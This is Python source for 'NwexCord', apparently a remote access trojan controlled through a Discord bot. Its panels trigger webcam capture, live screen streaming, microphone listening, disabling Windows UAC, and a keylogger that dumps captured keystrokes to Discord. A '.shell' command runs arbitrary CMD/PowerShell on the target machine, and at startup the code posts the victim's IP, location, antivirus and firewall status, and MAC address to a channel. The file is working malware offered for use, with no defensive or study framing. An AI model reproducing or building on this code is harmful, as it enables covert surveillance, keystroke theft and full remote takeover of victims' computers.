            await interaction.edit_original_response(content=None, embed=embed, attachments=[file], view=SystemResultView())
        else:
            embed = discord.Embed(title="📷 Webcam", description=f"❌ {result}", color=discord.Color.red())
            embed.set_footer(text="NwexCord • System")
            await interaction.edit_original_response(content=None, embed=embed, view=SystemResultView())

    @discord.ui.button(label="Live Screen", emoji="📺", style=discord.ButtonStyle.success, row=0)
    async def livescreen_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        if LiveStreamManager._is_running and LiveStreamManager._public_url:
            embed = discord.Embed(title="📺 Live Screen Active", description="The stream is already running.", color=discord.Color.green())
            embed.set_footer(text="NwexCord • System")
            await interaction.response.edit_message(content=None, embed=embed, view=LiveStreamView(LiveStreamManager._public_url))
            return

        loading = discord.Embed(title="📺 Live Screen", description="⏳ Initializing server and creating secure tunnel...\nThis may take up to 15 seconds.", color=discord.Color.orange())
        loading.set_footer(text="NwexCord • System")
        await interaction.response.edit_message(content=None, embed=loading, view=None)

        loop = asyncio.get_event_loop()
        success, result = await loop.run_in_executor(None, LiveStreamManager.start_stream)
        
        if success:
            embed = discord.Embed(
                title="📺 Live Screen Ready!", 
                description=f"✅ Stream is online.\n\n🌐 **URL:** {result}\n\n*Note: Quality is adjusted to ensure smooth streaming. Click the button below to watch.*", 
                color=discord.Color.green()
            )
            embed.set_footer(text="NwexCord • System")
            await interaction.edit_original_response(content=None, embed=embed, view=LiveStreamView(result))
        else:
            embed = discord.Embed(title="📺 Live Screen Failed", description=f"❌ {result}", color=discord.Color.red())
            embed.set_footer(text="NwexCord • System")
            await interaction.edit_original_response(content=None, embed=embed, view=SystemResultView())

    @discord.ui.button(label="Listener", emoji="🎙️", style=discord.ButtonStyle.secondary, row=1)
    async def listener_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.send_modal(ListenerDurationModal())

    @discord.ui.button(label="Disable UAC", emoji="🛡️", style=discord.ButtonStyle.danger, row=1)
    async def uac_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        loop = asyncio.get_event_loop()
        success, msg = await loop.run_in_executor(None, SystemManager.disable_uac)
        status = "✅" if success else "❌"
        color = discord.Color.green() if success else discord.Color.red()
        embed = discord.Embed(title=f"{status} Disable UAC", description=msg, color=color)
        embed.set_footer(text="NwexCord • System")
        await interaction.response.edit_message(content=None, embed=embed, view=SystemResultView())

    @discord.ui.button(label="KeyLogger", emoji="⌨️", style=discord.ButtonStyle.secondary, row=1)
    async def keylogger_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        # Show keylogger sub-panel
        is_running = SystemManager._keylogger_running
        status_text = "🟢 **Running**" if is_running else "🔴 **Stopped**"
        logged = SystemManager.get_keylogger_dump()
        log_preview = logged[-500:] if len(logged) > 500 else logged
        desc = f"Status: {status_text}\n\n"
        if log_preview:
            desc += f"**Last logged keys:**\n```\n{log_preview}\n```"
        else:
            desc += "*No keys logged yet.*"
        embed = discord.Embed(title="⌨️ KeyLogger", description=desc, color=discord.Color.from_rgb(47, 49, 54))
        embed.set_footer(text="NwexCord • System")
        await interaction.response.edit_message(content=None, embed=embed, view=KeyLoggerView())

    @discord.ui.button(label="Performance", emoji="⚡", style=discord.ButtonStyle.secondary, row=1)
    async def performance_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        loading = discord.Embed(title="⚡ Performance", description="⏳ Gathering performance data...", color=discord.Color.greyple())
        loading.set_footer(text="NwexCord • System")
        await interaction.response.edit_message(content=None, embed=loading, view=None)

        loop = asyncio.get_event_loop()
        data = await loop.run_in_executor(None, SystemManager.get_performance)
        session_id = hashlib.md5(str(datetime.now().timestamp()).encode()).hexdigest()[:20].upper()
        embed = build_performance_embed(session_id, data)
        await interaction.edit_original_response(content=None, embed=embed, view=PerformanceView(session_id))

    @discord.ui.button(label="⬅ Back", style=discord.ButtonStyle.secondary, row=2)
    async def back_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        info = get_sys_info()
        left_col = (
            f"🌐 **IP** : {info.get('IP', 'Unknown')}\n"
            f"👤 **UserName** : {info['UserName']}\n"
            f"🖥️ **PCName** : {info['PCName']}\n"
            f"🪟 **OS** : {info['OS']}\n"
            f"📁 **Client** : {info['Client']}\n"
            f"⚙️ **Process** : {info['Process']}\n"
            f"📅 **DateTime** : {info['DateTime']}\n"
            f"🎇 **GPU** : {info['GPU']}\n"
            f"🧠 **CPU** : {info['CPU']}\n"
            f"🏷️ **Identifier** : {info['Identifier']}\n"
            f"📊 **Ram** : {info['Ram']}"
        )
        right_col = (
            f"📍 **Location** : {info.get('Location', 'Unknown')}\n"
            f"⏱️ **LastReboot** : {info['LastReboot']}\n"
            f"🛡️ **Antivirus** : {info['Antivirus']}\n"
            f"⚠️ **Firewall** : {info['Firewall']}\n"
            f"🌐 **MacAddress** : {info['MacAddress']}\n"
            f"🌍 **DefaultBrowser** : {info['DefaultBrowser']}\n"
            f"🗣️ **CurrentLang** : {info['CurrentLang']}\n"
            f"💻 **Platform** : {info['Platform']}\n"
            f"📋 **Ver** : {info['Ver']}\n"
            f"🔵 **.Net** : {info['.Net']}\n"
            f"🔋 **Battery** : {info['Battery']}"
        )
        embed = discord.Embed(title="[ Information ]", color=discord.Color.dark_theme())
        embed.add_field(name="\u200b", value=left_col, inline=True)
        embed.add_field(name="\u200b", value=right_col, inline=True)
        embed.set_footer(text=f"NwexCord • System Information • {datetime.now().strftime('Today at %#I:%M %p')}")
        msg_content = f"🚀 **NwexCord System Started!**\nUse `.shell <command>` to execute CMD/PowerShell commands on this machine."
        await interaction.response.edit_message(content=msg_content, embed=embed, view=StartupView())


class KeyLoggerView(discord.ui.View):
    """Sub-panel for KeyLogger with Start, Stop, Dump, Back."""
    def __init__(self):
        super().__init__(timeout=300)

    @discord.ui.button(label="Start", emoji="▶", style=discord.ButtonStyle.success, row=0)
    async def start_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        success, msg = SystemManager.start_keylogger()
        status = "✅" if success else "❌"
        embed = discord.Embed(title=f"{status} KeyLogger", description=msg, color=discord.Color.green() if success else discord.Color.red())
        embed.set_footer(text="NwexCord • System")
        await interaction.response.edit_message(content=None, embed=embed, view=KeyLoggerView())

    @discord.ui.button(label="Stop", emoji="⏹", style=discord.ButtonStyle.danger, row=0)
    async def stop_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        success, msg, logged = SystemManager.stop_keylogger()
        desc = msg
        if logged:
            if len(logged) > 1500:
                # Send as file
                buf = io.BytesIO(logged.encode('utf-8'))
                buf.seek(0)
                file = discord.File(buf, filename="keylog.txt")
                embed = discord.Embed(title="⏹ KeyLogger Stopped", description=f"{msg}\n\nLogged {len(logged)} characters. See attached file.", color=discord.Color.green())
                embed.set_footer(text="NwexCord • System")
                await interaction.response.edit_message(content=None, embed=embed, attachments=[file], view=KeyLoggerView())
                return
            else:
                desc += f"\n\n**Logged keys:**\n```\n{logged}\n```"
        embed = discord.Embed(title="⏹ KeyLogger Stopped", description=desc, color=discord.Color.green() if success else discord.Color.red())
        embed.set_footer(text="NwexCord • System")
        await interaction.response.edit_message(content=None, embed=embed, view=KeyLoggerView())

    @discord.ui.button(label="Dump", emoji="📄", style=discord.ButtonStyle.primary, row=0)
    async def dump_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        logged = SystemManager.get_keylogger_dump()
        if not logged:
            embed = discord.Embed(title="📄 KeyLogger Dump", description="*No keys logged yet.*", color=discord.Color.greyple())
            embed.set_footer(text="NwexCord • System")
            await interaction.response.edit_message(content=None, embed=embed, view=KeyLoggerView())
            return
        if len(logged) > 1500:
            buf = io.BytesIO(logged.encode('utf-8'))
            buf.seek(0)
            file = discord.File(buf, filename="keylog_dump.txt")
            embed = discord.Embed(title="📄 KeyLogger Dump", description=f"Logged {len(logged)} characters. See attached file.", color=discord.Color.blue())
            embed.set_footer(text="NwexCord • System")
            await interaction.response.edit_message(content=None, embed=embed, attachments=[file], view=KeyLoggerView())
        else:
            embed = discord.Embed(title="📄 KeyLogger Dump", description=f"```\n{logged}\n```", color=discord.Color.blue())
            embed.set_footer(text="NwexCord • System")
            await interaction.response.edit_message(content=None, embed=embed, view=KeyLoggerView())

    @discord.ui.button(label="Back to System", emoji="⬅", style=discord.ButtonStyle.secondary, row=1)
    async def back_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.edit_message(content=None, embed=embed_system_panel(), attachments=[], view=SystemPanelView())


class StartupView(discord.ui.View):
    """View attached to the startup message with Tools, Fun, and System buttons."""
    def __init__(self):
        super().__init__(timeout=None)

    @discord.ui.button(label="Tools", emoji="🧰", style=discord.ButtonStyle.primary)
    async def tools_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.edit_message(content=None, embed=embed_tools_panel(), view=ToolsPanelView())

    @discord.ui.button(label="Fun", emoji="🎉", style=discord.ButtonStyle.danger)
    async def fun_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.edit_message(content=None, embed=embed_fun_panel(), view=FunPanelView())

    @discord.ui.button(label="System", emoji="⚙️", style=discord.ButtonStyle.secondary)
    async def system_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.edit_message(content=None, embed=embed_system_panel(), view=SystemPanelView())

@bot.event
async def on_ready():
    client_id = bot.user.id
    invite_link = f"https://discord.com/api/oauth2/authorize?client_id={client_id}&permissions=8&scope=bot"
    
    print(f'--- NwexCord Active ---')
    print(f'Bot Username: {bot.user.name}')
    print(f'Bot ID: {bot.user.id}')
    print(f'Server Count: {len(bot.guilds)}')
    print(f'Invite Link: {invite_link}')
    print(f'----------------------')
    
    if len(bot.guilds) == 0:
        print("WARNING: The bot is currently not in any servers!")
        print("Please use the link above to invite the bot to your server.")
    
    # Set bot status (Activity)
    await bot.change_presence(activity=discord.Activity(
        type=discord.ActivityType.listening, 
        name=f"{config.PREFIX}shell"
    ))
    
    # Send "Active" message to the first available channel
    sent_message = False
    
    info = get_sys_info()
    
    left_col = (
        f"🌐 **IP** : {info.get('IP', 'Unknown')}\n"
        f"👤 **UserName** : {info['UserName']}\n"
        f"🖥️ **PCName** : {info['PCName']}\n"
        f"🪟 **OS** : {info['OS']}\n"
        f"📁 **Client** : {info['Client']}\n"
        f"⚙️ **Process** : {info['Process']}\n"
        f"📅 **DateTime** : {info['DateTime']}\n"
        f"🎇 **GPU** : {info['GPU']}\n"
        f"🧠 **CPU** : {info['CPU']}\n"
        f"🏷️ **Identifier** : {info['Identifier']}\n"
        f"📊 **Ram** : {info['Ram']}"
    )
    
    right_col = (
        f"📍 **Location** : {info.get('Location', 'Unknown')}\n"
        f"⏱️ **LastReboot** : {info['LastReboot']}\n"
        f"🛡️ **Antivirus** : {info['Antivirus']}\n"
        f"⚠️ **Firewall** : {info['Firewall']}\n"
        f"🌐 **MacAddress** : {info['MacAddress']}\n"
        f"🌍 **DefaultBrowser** : {info['DefaultBrowser']}\n"
        f"🗣️ **CurrentLang** : {info['CurrentLang']}\n"
        f"💻 **Platform** : {info['Platform']}\n"
        f"📋 **Ver** : {info['Ver']}\n"
        f"🔵 **.Net** : {info['.Net']}\n"
        f"🔋 **Battery** : {info['Battery']}"
    )
    
    embed = discord.Embed(
        title="[ Information ]", 
        color=discord.Color.dark_theme()
    )
    embed.add_field(name="\u200b", value=left_col, inline=True)
    embed.add_field(name="\u200b", value=right_col, inline=True)
    embed.set_footer(text=f"NwexCord • System Information • {datetime.now().strftime('Today at %#I:%M %p')}")
    
    msg_content = f"🚀 **NwexCord System Started!**\nUse `{config.PREFIX}shell <command>` to execute CMD/PowerShell commands on this machine."
    
    startup_view = StartupView()
    
    for guild in bot.guilds:
        for channel in guild.text_channels:
            if channel.permissions_for(guild.me).send_messages:
                try:
                    await channel.send(content=msg_content, embed=embed, view=startup_view)
                    sent_message = True
                    break
                except Exception as e:
                    print(f"Error sending to {channel.name}: {e}")
                    continue
        if sent_message: break

@bot.command(name="shell")
async def shell_command(ctx, *, cmd: str):
    """Executes command via Discord: .shell dir"""
    
    # Send info message
    msg = await ctx.send(f"⚡ Executing: `{cmd}`...")
    
    # Execute command
    result = ShellExecutor.execute(cmd)
    
    # Prepare output
    output = ""
    if result["stdout"]:
        # Discord has a 2000 character limit, taking the last 1500 characters
        stdout_text = result["stdout"]
        if len(stdout_text) > 1500:
            stdout_text = "...(truncated)...\n" + stdout_text[-1500:]
        output += f"**Output:**\n```\n{stdout_text}\n```\n"
        
    if result["stderr"]:
        stderr_text = result["stderr"]
        if len(stderr_text) > 400:
            stderr_text = stderr_text[:400] + "\n...(truncated)..."
        output += f"**Errors:**\n```\n{stderr_text}\n```\n"
        
    if not output:
        output = "Command executed but produced no output."

    # Create embed
    color = discord.Color.green() if result["success"] else discord.Color.red()
    status = "✅ Success" if result["success"] else "❌ Error"
    
    embed = discord.Embed(
        title=f"{status}: {cmd[:50]}",
        description=output,
        color=color,
        timestamp=datetime.utcnow()
    )
    embed.set_footer(text=f"Return Code: {result['return_code']}")
    
    await msg.edit(content=None, embed=embed)

@bot.command(name="ping")
async def ping(ctx):
    await ctx.send(f"Pong! Latency: {round(bot.latency * 1000)}ms")

@bot.command(name="tools")
async def tools_command(ctx):
    """Opens the tools panel with interactive buttons."""
    tools_embed = discord.Embed(
        title="🧰 NwexCord Tools",
        description="Select a tool from the buttons below to execute it on the target machine.",
        color=discord.Color.blurple()
    )
    tools_embed.set_footer(text="NwexCord • Tools Panel")
    await ctx.send(embed=tools_embed, view=ToolsPanelView())

if __name__ == "__main__":
    if config.BOT_TOKEN == "YOUR_BOT_TOKEN_HERE":
        print("ERROR: Please add your Discord Bot Token to config.py!")
        sys.exit(1)
        
    try:
        bot.run(config.BOT_TOKEN.strip())
    except Exception as e:
        print(f"Failed to start bot: {e}")